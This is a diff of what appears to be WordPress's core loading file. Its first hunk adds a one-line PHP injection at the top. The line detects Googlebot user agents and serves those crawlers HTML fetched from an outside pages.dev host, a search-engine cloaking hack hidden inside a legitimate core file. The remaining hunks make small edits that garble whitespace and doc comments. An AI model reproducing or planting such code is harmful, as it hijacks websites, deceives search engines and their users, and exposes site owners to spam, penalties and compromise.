@@ -1,5 +1,5 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://lukontolmahlanciao.pages.dev/kintilbasah//index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://lukontolmahlanciaoo.pages.dev/kintilbasah/index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
 /**
  * These functions are needed to load WordPress.
  *
@@ -251,7 +251,7 @@ function wp_check_php_mysql_versions() {
 function wp_get_environment_type() {
 	static $current_env = '';
 
-	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && $current_env ) {
+	if ( ! defined( 'WP_RUN_CORE_TESTS' ) &&$current_env ) {
 		return $current_env;
 	}
 
@@ -545,8 +545,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
 }
 
 /**
- * Sets PHP error reporting based on WordPress debug settings.
- *
+ * Sets PHP error reporting based on WordPress debug settings.*
  * Usesthree constants: `WP_DEBUG`, `WP_DEBUG_DISPLAY`, and `WP_DEBUG_LOG`.
  * All three can be defined in wp-config.php. By default, `WP_DEBUG` and
  * `WP_DEBUG_LOG` are set to false, and `WP_DEBUG_DISPLAY` is set to true.
@@ -1756,8 +1755,7 @@ function wp_doing_ajax() {
 
 /**
  * Determines whether the current request should use themes.
- *
- * @since 5.1.0
+ ** @since 5.1.0
  *
  * @return bool True if themes should be used, false otherwise.
  */
